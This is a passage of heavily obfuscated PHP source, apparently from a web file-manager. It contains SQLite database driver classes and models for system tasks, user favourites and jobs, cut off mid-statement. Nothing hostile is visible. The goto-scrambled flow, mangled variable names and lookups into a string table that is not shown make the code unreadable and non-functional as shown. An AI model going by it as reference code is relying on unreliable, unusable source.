$this->initConnect(!1); if (!$this->_linkID) { return !1; } goto cÌéÛáÁ; F›¡¢ò®­: think_status($eğË™êÛÇ [20]); $this->queryID = sqlite_query($this->_linkID, $eÎğõçÅØœ); $this->debug(); goto E­ÃíÉº»ƒ; cÌéÛáÁ: $this->queryStr = $eÎğõçÅØœ; if ($this->queryID) { $this->free(); } think_action_status($eğË™êÛÇ [19], 1); goto F›¡¢ò®­; dÛñØß½: } public function execute($EÒÒç­é¨í) { goto CÈÇî¹¾Şò; CÈÇî¹¾Şò: $dÈÙİƒáĞ´ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto FğÍ­Ìö°; Dª± ¸ÄÑ: think_status($dÈÙİƒáĞ´[20]); $eà†¯ŠôØñ = sqlite_exec($this->_linkID, $EÒÒç­é¨í); $this->debug(); goto C‡âŒÌğ¢å; FğÍ­Ìö°: $this->queryStr = $EÒÒç­é¨í; if ($this->queryID) { $this->free(); } think_action_status($dÈÙİƒáĞ´[21], 1); goto Dª± ¸ÄÑ; C‡âŒÌğ¢å: if (!1 === $eà†¯ŠôØñ) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } goto d†Ûíì£’; d†Ûíì£’: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $f¾ ÕÑ¯Êµ = sqlite_query($this->_linkID, $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][23]); if (!$f¾ ÕÑ¯Êµ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $D–—ƒôË¥İ = sqlite_query($this->_linkID, $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][24]); if (!$D–—ƒôË¥İ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $Eƒæ°¹÷„ö = array(); if ($this->numRows > 0) { for ($BÅ¦ì®Ë­â = 0; $BÅ¦ì®Ë­â < $this->numRows; $BÅ¦ì®Ë­â++) { $Eƒæ°¹÷„ö[$BÅ¦ì®Ë­â] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $Eƒæ°¹÷„ö; } public function getFields($B‰ªØ‚ĞÏ) { $fÃ¿Ä‹Ç · =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $D¯ÚÏ‡Ê = $this->query($fÃ¿Ä‹Ç ·[25] . $B‰ªØ‚ĞÏ . $fÃ¿Ä‹Ç ·[26]); $dñˆ¾Şİ‰  = array(); if ($D¯ÚÏ‡Ê) { foreach ($D¯ÚÏ‡Ê as $fçÕ®Ö†¤ => $B²Š™Ş—¸Ë) { $dñˆ¾Şİ‰ [$B²Š™Ş—¸Ë[$fÃ¿Ä‹Ç ·[27]]] = array($fÃ¿Ä‹Ç ·[28] => $B²Š™Ş—¸Ë[$fÃ¿Ä‹Ç ·[27]], $fÃ¿Ä‹Ç ·[29] => $B²Š™Ş—¸Ë[$fÃ¿Ä‹Ç ·[30]], $fÃ¿Ä‹Ç ·[31] => (bool) ($B²Š™Ş—¸Ë[$fÃ¿Ä‹Ç ·[32]] === $fÃ¿Ä‹Ç ·[33]), $fÃ¿Ä‹Ç ·[34] => $B²Š™Ş—¸Ë[$fÃ¿Ä‹Ç ·[35]], $fÃ¿Ä‹Ç ·[36] => strtolower($B²Š™Ş—¸Ë[$fÃ¿Ä‹Ç ·[37]]) == $fÃ¿Ä‹Ç ·[38], $fÃ¿Ä‹Ç ·[39] => strtolower($B²Š™Ş—¸Ë[$fÃ¿Ä‹Ç ·[40]]) == $fÃ¿Ä‹Ç ·[41]); } } return $dñˆ¾Şİ‰ ; } public function getTables($BÜƒÙàÌÛ° = '') { $d§†äÈã› =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $c¸¨‘ÑîĞé = $this->query($d§†äÈã›[42] . $d§†äÈã›[43] . $d§†äÈã›[44]); $eÂÑÀÂ‡¸Ş = array(); foreach ($c¸¨‘ÑîĞé as $CŞ¶Ü¢×¼Æ => $Eš¢å—ÂŒ) { $eÂÑÀÂ‡¸Ş[$CŞ¶Ü¢×¼Æ] = current($Eš¢å—ÂŒ); } return $eÂÑÀÂ‡¸Ş; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $E­Ù¢¨‘ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $AåµÈÌÍ— = sqlite_last_error($this->_linkID); $this->error = $AåµÈÌÍ— . $E­Ù¢¨‘[4] . sqlite_error_string($AåµÈÌÍ—); if ($E­Ù¢¨‘[33] != $this->queryStr) { $this->error .= LNG($E­Ù¢¨‘[45]) . $this->queryStr; } think_trace($this->error, $E­Ù¢¨‘[33], $E­Ù¢¨‘[46]); return $this->error; } public function escapeString($FÛ„Ñæ“œ½) { return sqlite_escape_string($FÛ„Ñæ“œ½); } public function parseLimit($Déêõ««¿) { $A¬‰‰´¨ä =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $fÎ¹¼æ„¬ = $A¬‰‰´¨ä[33]; if (!empty($Déêõ««¿)) { $Déêõ««¿ = explode($A¬‰‰´¨ä[47], $Déêõ««¿); if (count($Déêõ««¿) > 1) { $fÎ¹¼æ„¬ .= $A¬‰‰´¨ä[48] . $Déêõ««¿[1] . $A¬‰‰´¨ä[49] . $Déêõ««¿[0] . $A¬‰‰´¨ä[50]; } else { $fÎ¹¼æ„¬ .= $A¬‰‰´¨ä[48] . $Déêõ««¿[0] . $A¬‰‰´¨ä[50]; } } return $fÎ¹¼æ„¬; } } class DbSqlite3Base extends Db { public function __construct($c„¨¨ÓÆÜ‚ = '') { $f¼‘”ßÒÆ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!class_exists($f¼‘”ßÒÆ[51])) { think_exception(think_lang($f¼‘”ßÒÆ[10]) . $f¼‘”ßÒÆ[52]); } if (!empty($c„¨¨ÓÆÜ‚)) { if (!isset($c„¨¨ÓÆÜ‚[$f¼‘”ßÒÆ[12]])) { $c„¨¨ÓÆÜ‚[$f¼‘”ßÒÆ[12]] = 438; } $this->config = $c„¨¨ÓÆÜ‚; if (empty($this->config[$f¼‘”ßÒÆ[13]])) { $this->config[$f¼‘”ßÒÆ[13]] = array(); } } } public function connect($Få„’˜±†Ö = '', $a°œæñ®Ù¨ = 0) { $AÏëµ•‚¹ã =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!isset($this->linkID[$a°œæñ®Ù¨])) { if (empty($Få„’˜±†Ö)) { $Få„’˜±†Ö = $this->config; } $this->linkID[$a°œæñ®Ù¨] = new SQLite3($Få„’˜±†Ö[$AÏëµ•‚¹ã[17]]); if (!$this->linkID[$a°œæñ®Ù¨]) { think_exception($this->linkID[$a°œæñ®Ù¨]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$a°œæñ®Ù¨]->busyTimeout(30000); if (1 != think_config($AÏëµ•‚¹ã[18])) { unset($this->config); } } return $this->linkID[$a°œæñ®Ù¨]; } public function free() { $this->queryID = null; } public function query($F¸ÄŞÉ‚£) { goto Eò‚Ó‘Ä§œ; B­è’Í®Á: $this->queryStr = $F¸ÄŞÉ‚£; if ($this->queryID) { $this->free(); } think_action_status($a¤«¬ºô¾’[19], 1); goto fÇ¬ç‰ÜÍ; Eò‚Ó‘Ä§œ: $a¤«¬ºô¾’ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto B­è’Í®Á; BïìØ’æ ¾: if (!1 === $this->queryID) { $this->error(); return !1; } else { $bğë¹™Ä“ = $this->getAll(); $this->numRows = count($bğë¹™Ä“); return $bğë¹™Ä“; } goto E‘öè›è†Œ; fÇ¬ç‰ÜÍ: think_status($a¤«¬ºô¾’[20]); $this->queryID = $this->_linkID->query($F¸ÄŞÉ‚£); $this->debug(); goto BïìØ’æ ¾; E‘öè›è†Œ: } public function execute($e¾ÊÖ…êÒ) { goto cáâƒÉÇÉæ; BõŒïÀ¼è: if (!1 === $aîæÆë¨ƒ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } goto EÓÃ¹ÊÊåˆ; cáâƒÉÇÉæ: $E§°ÛÄ™’ù =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto cÆ•¤½§ô; b«øî»¹ÂĞ: think_status($E§°ÛÄ™’ù[20]); $aîæÆë¨ƒ = $this->_linkID->exec($e¾ÊÖ…êÒ); $this->debug(); goto BõŒïÀ¼è; cÆ•¤½§ô: $this->queryStr = $e¾ÊÖ…êÒ; if ($this->queryID) { $this->free(); } think_action_status($E§°ÛÄ™’ù[21], 1); goto b«øî»¹ÂĞ; EÓÃ¹ÊÊåˆ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $cøÁ¸ªâ¤ = $this->_linkID->query($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][23]); if (!$cøÁ¸ªâ¤) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $b–­ªéÒ¡ = $this->_linkID->query($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][24]); if (!$b–­ªéÒ¡) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $E¼éù­„‹ç = array(); while ($DŒÇ¹ë…®Œ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $E¼éù­„‹ç[] = $DŒÇ¹ë…®Œ; } $this->queryID->reset(); return $E¼éù­„‹ç; } public function getFields($D¬òŒ³ÍƒÌ) { $D˜ÓãÆÜç¿ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $c¡ˆÆ­–·¨ = $this->query($D˜ÓãÆÜç¿[25] . $D¬òŒ³ÍƒÌ . $D˜ÓãÆÜç¿[26]); $A´Œ®îÒÍ = array(); if ($c¡ˆÆ­–·¨) { foreach ($c¡ˆÆ­–·¨ as $Eİª˜†…øŸ => $DğÒ‡«Ğ®Å) { $A´Œ®îÒÍ[$DğÒ‡«Ğ®Å[$D˜ÓãÆÜç¿[28]]] = array($D˜ÓãÆÜç¿[28] => $DğÒ‡«Ğ®Å[$D˜ÓãÆÜç¿[28]], $D˜ÓãÆÜç¿[29] => $DğÒ‡«Ğ®Å[$D˜ÓãÆÜç¿[29]], $D˜ÓãÆÜç¿[31] => (bool) ($DğÒ‡«Ğ®Å[$D˜ÓãÆÜç¿[31]] === $D˜ÓãÆÜç¿[33]), $D˜ÓãÆÜç¿[34] => $DğÒ‡«Ğ®Å[$D˜ÓãÆÜç¿[53]], $D˜ÓãÆÜç¿[36] => (bool) $DğÒ‡«Ğ®Å[$D˜ÓãÆÜç¿[54]], $D˜ÓãÆÜç¿[39] => (bool) $DğÒ‡«Ğ®Å[$D˜ÓãÆÜç¿[54]]); } } return $A´Œ®îÒÍ; } public function getTables($B£Ä»óèÅ = '') { $d‹êÂ±¢Ñ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $e¤¬‘ö–ó = $this->query($d‹êÂ±¢Ñ[42] . $d‹êÂ±¢Ñ[43] . $d‹êÂ±¢Ñ[44]); $Fæ¿‹Ó¥â = array(); foreach ($e¤¬‘ö–ó as $D—‹Ÿ†è½µ => $Fì‰¿ç—¯š) { $Fæ¿‹Ó¥â[$D—‹Ÿ†è½µ] = current($Fì‰¿ç—¯š); } return $Fæ¿‹Ó¥â; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $AöÕÊ¯ÎñÖ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $this->error = $this->_linkID->lastErrorMsg(); if ($AöÕÊ¯ÎñÖ[33] != $this->queryStr) { $this->error .= LNG($AöÕÊ¯ÎñÖ[45]) . $this->queryStr; } think_trace($this->error, $AöÕÊ¯ÎñÖ[33], $AöÕÊ¯ÎñÖ[46]); return $this->error; } public function escapeString($D·•óñ®İá) { $b®¯÷ò÷î§ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if ($this->_linkID) { return $this->_linkID->escapeString($D·•óñ®İá); } return str_ireplace($b®¯÷ò÷î§[55], $b®¯÷ò÷î§[56], $D·•óñ®İá); } public function parseLimit($Bö³ ¼º§ª) { $c™´×ƒàŸ¯ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $E£×âª‹ç‡ = $c™´×ƒàŸ¯[33]; if (!empty($Bö³ ¼º§ª)) { $Bö³ ¼º§ª = explode($c™´×ƒàŸ¯[47], $Bö³ ¼º§ª); if (count($Bö³ ¼º§ª) > 1) { $E£×âª‹ç‡ .= $c™´×ƒàŸ¯[48] . $Bö³ ¼º§ª[1] . $c™´×ƒàŸ¯[49] . $Bö³ ¼º§ª[0] . $c™´×ƒàŸ¯[50]; } else { $E£×âª‹ç‡ .= $c™´×ƒàŸ¯[48] . $Bö³ ¼º§ª[0] . $c™´×ƒàŸ¯[50]; } } return $E£×âª‹ç‡; } } goto DÆ°ø¢Á; a†á–éÙ˜: define($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][227], 2); define($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][228], 3); define($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][229], 1); goto aƒÃß¢äŠ“; d»¿Ÿ½Ïîù: class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\145\155\56\164\141\x73\x6b\x4c\151\x73\x74"; public $field = array("\x6e\x61\x6d\145", "\x74\171\160\145", "\145\x76\145\156\x74", "\164\151\155\x65", "\144\145\x73\x63", "\x73\x79\x73\164\x65\155", "\x65\156\x61\142\x6c\145", "\154\141\163\164\x52\x75\x6e", "\x73\157\162\164"); public function listData($eÀ‡ãÎİĞ = false, $EïÏÆÌ¹¹ë = "\163\157\x72\164", $e‘Š¹İÓ““ = false) { return parent::listData($eÀ‡ãÎİĞ, $EïÏÆÌ¹¹ë, $e‘Š¹İÓ““); } public function add($b¬®õ¨‘¿) { $aÀ«¢ò¥ã =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $C¶İì÷”š = $this->findByName($b¬®õ¨‘¿[$aÀ«¢ò¥ã[28]]); if ($C¶İì÷”š) { return !1; } $b¬®õ¨‘¿[$aÀ«¢ò¥ã[1402]] = 0; $b¬®õ¨‘¿[$aÀ«¢ò¥ã[2130]] = $this->getSort(); return parent::insert($b¬®õ¨‘¿); } private function getSort() { $BÚ¯êÔÆæ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $bÌöº¤ÍÍÛ = parent::listData(); $fµ¶‹°† = array_to_keyvalue($bÌöº¤ÍÍÛ, $BÚ¯êÔÆæ[33], $BÚ¯êÔÆæ[2130]); return empty($fµ¶‹°†) ? 0 : max($fµ¶‹°†) + 1; } public function update($díê³åÕøÃ, $DŠ¯ŠÜÁÔÍ) { $f¡Õ¯ŒÅ×‰ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $EÎòë¸¬Ã÷ = $this->listData($díê³åÕøÃ); $dïéù½ëŒ = $this->findByName($DŠ¯ŠÜÁÔÍ[$f¡Õ¯ŒÅ×‰[28]]); if (!$EÎòë¸¬Ã÷ || $dïéù½ëŒ && $dïéù½ëŒ[$f¡Õ¯ŒÅ×‰[367]] != $EÎòë¸¬Ã÷[$f¡Õ¯ŒÅ×‰[367]]) { return !1; } return parent::update($díê³åÕøÃ, $DŠ¯ŠÜÁÔÍ); } public function remove($a³ÉƒÌâ†È, $EÁŸÜ‹± = false) { $B„Ô¼Ÿ™äŞ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $fç®ˆÁŠæ‰ = $this->listData($a³ÉƒÌâ†È); if (!$fç®ˆÁŠæ‰) { return; } if (!$EÁŸÜ‹± && $fç®ˆÁŠæ‰[$B„Ô¼Ÿ™äŞ[1077]] == $B„Ô¼Ÿ™äŞ[83]) { return !1; } return parent::remove($a³ÉƒÌâ†È); } public function enable($Cæ³ÔÚé˜˜, $cğ§Œ¼Í«Œ) { return $this->update($Cæ³ÔÚé˜˜, array($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][2508] => $cğ§Œ¼Í«Œ)); } public function run($E×­†¿Ëº) { return $this->update($E×­†¿Ëº, array($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][2518] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\165\x73\x65\x72\x5f\x66\141\166"; protected function cacheFunctionAlias($Aİë‰íŞ™›) { $dŞ¯¹Ã»­À =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; return array($dŞ¯¹Ã»­À[2204] => array(USER_ID, $dŞ¯¹Ã»­À[2519])); } protected function listData() { $A¿È…ë±½© =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $e…¯õí«Èš = array($A¿È…ë±½©[1428] => USER_ID, $A¿È…ë±½©[436] => 0); $föÑ”‰Ãåª = $A¿È…ë±½©[2520]; $eÖ¹¡ÓÌ = $this->field($föÑ”‰Ãåª)->where($e…¯õí«Èš)->order($A¿È…ë±½©[2521])->select(); return $eÖ¹¡ÓÌ ? $eÖ¹¡ÓÌ : array(); } protected function resetCache() { } protected function listView() { goto Fø´Æèø¹™; F‰¶©×ää¸: $cª¥»¿¦ˆ¢ = array_to_keyvalue($cª¥»¿¦ˆ¢, $eêÜ¼ïó†®[369]); foreach ($fí¤ÓËæ¸‚ as $AÊëÊ¦Òê => $EåäÒ …£÷) { $e‡Š£¸Åº = $cª¥»¿¦ˆ¢[$EåäÒ …£÷[$eêÜ¼ïó†®[75]]]; $e‡Š£¸Åº = $e‡Š£¸Åº ? $e‡Š£¸Åº : array(); $fí¤ÓËæ¸‚[$AÊëÊ¦Òê] = array_merge($e‡Š£¸Åº, $EåäÒ …£÷); } return $fí¤ÓËæ¸‚; goto D„æ„ƒÃ›Î; e¡§ï«œËæ: $E„³Ç¿† ğ = array($eêÜ¼ïó†®[383] => array($eêÜ¼ïó†®[384], $C×©Ú´§ã)); $cª¥»¿¦ˆ¢ = Model($eêÜ¼ïó†®[754])->listSource($E„³Ç¿† ğ, $aÃ®ÛŠÈ¯ä); $cª¥»¿¦ˆ¢ = array_merge($cª¥»¿¦ˆ¢[$eêÜ¼ïó†®[73]], $cª¥»¿¦ˆ¢[$eêÜ¼ïó†®[74]]); goto F‰¶©×ää¸; D›˜ƒß‚ù: $C×©Ú´§ã = array_to_keyvalue($A„àÒ¶ÓÈï, $eêÜ¼ïó†®[33], $eêÜ¼ïó†®[75]); if (!$C×©Ú´§ã) { return $fí¤ÓËæ¸‚; } $aÃ®ÛŠÈ¯ä = 2000; goto e¡§ï«œËæ; Fø´Æèø¹™: $eêÜ¼ïó†® =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $fí¤ÓËæ¸‚ = $this->listData(); $A„àÒ¶ÓÈï = array_filter_by_field($fí¤ÓËæ¸‚, $eêÜ¼ïó†®[29], $eêÜ¼ïó†®[382]); goto D›˜ƒß‚ù; D„æ„ƒÃ›Î: } protected function addFav($dÃ¾Ç«²Ğµ, $b‘Ô¤â”‡ä = '', $b Ø‹ÀŠ·ù = "\163\157\x75\162\143\145") { goto D¤â…¢Ú¦; D¤â…¢Ú¦: $AÙ¹‡Ô‹ÔÇ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $f¯‡óŠ»µ = array($AÙ¹‡Ô‹ÔÇ[1428] => USER_ID, $AÙ¹‡Ô‹ÔÇ[436] => 0, $AÙ¹‡Ô‹ÔÇ[388] => $b Ø‹ÀŠ·ù, $AÙ¹‡Ô‹ÔÇ[387] => $dÃ¾Ç«²Ğµ); if ($this->where($f¯‡óŠ»µ)->find()) { return !1; } goto cƒ¡ï˜Ù; fˆÅ’î«Û‰: return $this->add($A©ª’ØÙ–); goto fø¯ÉŒš–; cƒ¡ï˜Ù: $f¯‡óŠ»µ = array($AÙ¹‡Ô‹ÔÇ[1428] => USER_ID, $AÙ¹‡Ô‹ÔÇ[436] => 0); $c‚ÛŠ½÷“ = $this->where($f¯‡óŠ»µ)->max($AÙ¹‡Ô‹ÔÇ[2130]); if (!$c‚ÛŠ½÷“) { $c‚ÛŠ½÷“ = 0; } goto f“çñÄ”•; f“çñÄ”•: if (!$b‘Ô¤â”‡ä && $b Ø‹ÀŠ·ù == $AÙ¹‡Ô‹ÔÇ[382]) { $B¸ÆªÊÀØ = Model($AÙ¹‡Ô‹ÔÇ[1114])->where(array($AÙ¹‡Ô‹ÔÇ[383] => $dÃ¾Ç«²Ğµ))->find(); if (!$B¸ÆªÊÀØ) { return !1; } $b‘Ô¤â”‡ä = $B¸ÆªÊÀØ[$AÙ¹‡Ô‹ÔÇ[28]]; } $b‘Ô¤â”‡ä = $this->getAutoName($b‘Ô¤â”‡ä); $A©ª’ØÙ– = array($AÙ¹‡Ô‹ÔÇ[1428] => USER_ID, $AÙ¹‡Ô‹ÔÇ[436] => 0, $AÙ¹‡Ô‹ÔÇ[386] => $b‘Ô¤â”‡ä, $AÙ¹‡Ô‹ÔÇ[387] => $dÃ¾Ç«²Ğµ, $AÙ¹‡Ô‹ÔÇ[388] => $b Ø‹ÀŠ·ù, $AÙ¹‡Ô‹ÔÇ[2112] => $c‚ÛŠ½÷“ + 1); goto fˆÅ’î«Û‰; fø¯ÉŒš–: } protected function remove($fšñëà†­Ü) { $BàÅ‡Ö’ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $Bå¨º±Î»¡ = array($BàÅ‡Ö’[1428] => USER_ID, $BàÅ‡Ö’[385] => $fšñëà†­Ü); return $this->where($Bå¨º±Î»¡)->delete(); } protected function removeByName($B‹ˆáß¯‘) { $BİŒÓ»à¼¶ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $B‡»»…¯‡ = array($BİŒÓ»à¼¶[1428] => USER_ID, $BİŒÓ»à¼¶[386] => $B‹ˆáß¯‘, $BİŒÓ»à¼¶[436] => 0); return $this->where($B‡»»…¯‡)->delete(); } protected function rename($AóÙÂÔ”¡, $CªÇ¡É°óï) { $bùÈÁÊÒŞ« =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if ($AóÙÂÔ”¡ == $CªÇ¡É°óï) { return !1; } $dğ±Ô»ßë° = $this->getAutoName($CªÇ¡É°óï); if ($CªÇ¡É°óï != $dğ±Ô»ßë°) { return !1; } $EÍ´£êˆ‰ = array($bùÈÁÊÒŞ«[1428] => USER_ID, $bùÈÁÊÒŞ«[436] => 0, $bùÈÁÊÒŞ«[28] => $AóÙÂÔ”¡); return $this->where($EÍ´£êˆ‰)->save(array($bùÈÁÊÒŞ«[28] => $CªÇ¡É°óï)); } protected function resetSort($f¨Ú‰ªø‰õ) { $Dïåö˜¥³ğ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $f¨Ú‰ªø‰õ = is_array($f¨Ú‰ªø‰õ) ? $f¨Ú‰ªø‰õ : array(); $d©¤„ù—ö = array($Dïåö˜¥³ğ[1428] => USER_ID); for ($AÁëÓÔÕç® = 0; $AÁëÓÔÕç® < count($f¨Ú‰ªø‰õ); $AÁëÓÔÕç®++) { $d©¤„ù—ö[$Dïåö˜¥³ğ[385]] = $f¨Ú‰ªø‰õ[$AÁëÓÔÕç®]; $this->where($d©¤„ù—ö)->save(array($Dïåö˜¥³ğ[2112] => $AÁëÓÔÕç® + 1)); } return !0; } protected function moveTop($FÌ­’¹‰˜) { goto BÕˆ’„×Û; F‰Ñ¬ÌÒ»²: if (!$FˆØÏÏòÁÀ) { return; } $f‡†±ŠÉëÔ = $this->field($EÒ›—š‚[367])->where($eÆ‰íğ·ğ)->order($EÒ›—š‚[2521])->select(); $f‡†±ŠÉëÔ = array_to_keyvalue($f‡†±ŠÉëÔ, $EÒ›—š‚[33], $EÒ›—š‚[367]); goto C¾×ŒÓãÃ; bÎö¼ÊÁ÷í: return $this->resetSort($f‡†±ŠÉëÔ); goto aÂŠ–Í‹Ñ¯; C¾×ŒÓãÃ: $d¶œ…©¬ô = $f‡†±ŠÉëÔ; $f‡†±ŠÉëÔ = array_remove_value($f‡†±ŠÉëÔ, $FˆØÏÏòÁÀ[$EÒ›—š‚[367]]); array_unshift($f‡†±ŠÉëÔ, $FˆØÏÏòÁÀ[$EÒ›—š‚[367]]); goto bÎö¼ÊÁ÷í; BÕˆ’„×Û: $EÒ›—š‚ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $eÆ‰íğ·ğ = array($EÒ›—š‚[1428] => USER_ID, $EÒ›—š‚[436] => 0); $FˆØÏÏòÁÀ = $this->where($eÆ‰íğ·ğ)->where(array($EÒ›—š‚[28] => $FÌ­’¹‰˜))->find(); goto F‰Ñ¬ÌÒ»²; aÂŠ–Í‹Ñ¯: } protected function moveBottom($F±·­Ö‘†‡) { $b¥é‹»éä =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $F¡è‰‘Ãõ« = array($b¥é‹»éä[1428] => USER_ID, $b¥é‹»éä[436] => 0); $Aˆğø½ùåò = $this->where($F¡è‰‘Ãõ«)->max($b¥é‹»éä[2130]); $bµè ™çÙ› = array($b¥é‹»éä[2130] => $Aˆğø½ùåò + 1); return $this->where($F¡è‰‘Ãõ«)->where(array($b¥é‹»éä[28] => $F±·­Ö‘†‡))->save($bµè ™çÙ›); } private function getAutoName($d•¿Î›Àî´) { goto A×‹Õ£â¼œ; f‚Äãß¾ğê: return $d•¿Î›Àî´ . "\x28{$BêÖ´ŒŞ‰}\51"; goto A»ø°‘”; A×‹Õ£â¼œ: $C­ê¨Í´¬ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $eÏĞİ…®ñä = array($C­ê¨Í´¬[1428] => USER_ID, $C­ê¨Í´¬[436] => 0); $e•¢Íù‰é = $this->field($C­ê¨Í´¬[28])->where($eÏĞİ…®ñä)->select(); goto fœÏÓ²¾ö; fœÏÓ²¾ö: $e•¢Íù‰é = array_to_keyvalue($e•¢Íù‰é, $C­ê¨Í´¬[33], $C­ê¨Í´¬[28]); if (!$e•¢Íù‰é || !in_array($d•¿Î›Àî´, $e•¢Íù‰é)) { return $d•¿Î›Àî´; } for ($BêÖ´ŒŞ‰ = 0; $BêÖ´ŒŞ‰ < count($e•¢Íù‰é); $BêÖ´ŒŞ‰++) { if (!in_array($d•¿Î›Àî´ . "\x28{$BêÖ´ŒŞ‰}\51", $e•¢Íù‰é)) { return $d•¿Î›Àî´ . "\x28{$BêÖ´ŒŞ‰}\x29"; } } goto f‚Äãß¾ğê; A»ø°‘”: } } class UserJobModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\x65\155\x2e\152\x6f\x62\x4c\151\x73\x74"; public $field = array("\x6e\x61\155\145", "\144\x65\163\x63", "\x73\x6f\162\164"); const JOB_KEY = "\163\145\154\146\x4a\x6f\142\x4c\x69\163\164"; public function listData($aÙŒ…ÛóÛ« = false, $D´ˆç¼ï‚ = "\x73\x6f\x72\x74", $DÜîˆíÙË” = false) { return parent::listData($aÙŒ…ÛóÛ«, $D´ˆç¼ï‚, $DÜîˆíÙË”); } public function remove($C¼Û³í‰©Ğ) { return parent::remove($C¼Û³í‰©Ğ); } public function add($dÕ“‡”òœ) { $F¬ËÙ±Æºª =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if ($this->findByName($dÕ“‡”òœ[$F¬ËÙ±Æºª[28]])) { return !1; } $dÕ“‡”òœ[$F¬ËÙ±Æºª[2130]] = $this->getSort(); return parent::insert($dÕ“‡”òœ); } private function getSort() { $BÜ‹Ş´Îİ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $EÕ¦ƒàå‹ã = parent::listData(); $e¸×¿ÊˆË„ = array_to_keyvalue($EÕ¦ƒàå‹ã, $BÜ‹Ş´Îİ[33], $BÜ‹Ş´Îİ[2130]); return empty($e¸×¿ÊˆË„) ? 0 : max($e¸×¿ÊˆË„) + 1; } public function update($eƒãÁ©¶‰Ñ, $cª…À¦¿) { $dìŠ­ªî‚î =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $CÛ¥Íù’›³ = parent::listData($eƒãÁ©¶‰Ñ); $BçŠåÉ©‘¥ = $this->findByName($cª…À¦¿[$dìŠ­ªî‚î[28]]); if (!$CÛ¥Íù’›³ || $BçŠåÉ©‘¥ && $BçŠåÉ©‘¥[$dìŠ­ªî‚î[367]] != $CÛ¥Íù’›³[$dìŠ­ªî‚î[367]]) { return !1; } return parent::update($eƒãÁ©¶‰Ñ, $cª…À¦¿); } public function setUserJob($bõ¥¹¿ŒÇ½, $D±…Ëà˜Ùó) { goto Eêò¢  ¦Ÿ; A¥Èœ±ŞÓ: $b½öÇÔÏ·í = array_to_keyvalue($aË’Ñ­—ô¿, $a±ä‹˜È•—[28]); $bÍ¨¶ ³Ù± = $a±ä‹˜È•—[361]; foreach ($D±…Ëà˜Ùó as $D®©á Óò) { if ($b½öÇÔÏ·í[$D®©á Óò]) { $bÍ¨¶ ³Ù± .= $b½öÇÔÏ·í[$D®©á Óò][$a±ä‹˜È•—[367]] . $a±ä‹˜È•—[47]; } else { $E´Ô÷½®¯Å = 